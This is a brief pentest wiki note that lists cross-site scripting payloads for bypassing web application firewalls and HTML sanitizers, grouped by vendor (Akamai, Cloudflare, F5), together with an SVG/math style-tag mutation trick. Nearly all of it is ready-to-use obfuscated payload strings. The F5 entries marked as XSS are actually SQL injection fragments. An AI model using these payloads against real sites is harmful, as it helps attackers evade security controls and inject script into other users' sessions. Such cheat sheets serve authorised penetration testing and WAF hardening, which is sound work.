# General

Hide [[content/Web/Payloads/XSS|XSS]] payload in style tag of an SVG or math element for WAF or sanitizer bypass:

```
<svg><style> <script>alert(1)</script> </style></svg> <math><style> <img src onerror=alert(2)> </style></math>
```
# Akamai

[[content/Web/Payloads/XSS|XSS]] bypass 1:

```
1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
```
# Cloudflare

[[XSS]] bypass 1:

```
"><body/onload="{x:onerror=alert};x
```

[[XSS]] bypass 2:

```
<inpuT autofocus oNFocus="setTimeout(function() { /*\`*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\`*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;
```

# F5

[[XSS]] bypass 1:

```
+{`nothing`/*str*/(')}div%0B1+'
+{`nothing`/*str*/(')}div%0B0+'
```

[[XSS]] bypass 2:

```
{`noth`/*ing*/821}+union+%23%0a+distinctrow%0b/**/select+1,2,3--{`nothing`/**/TRUE}
```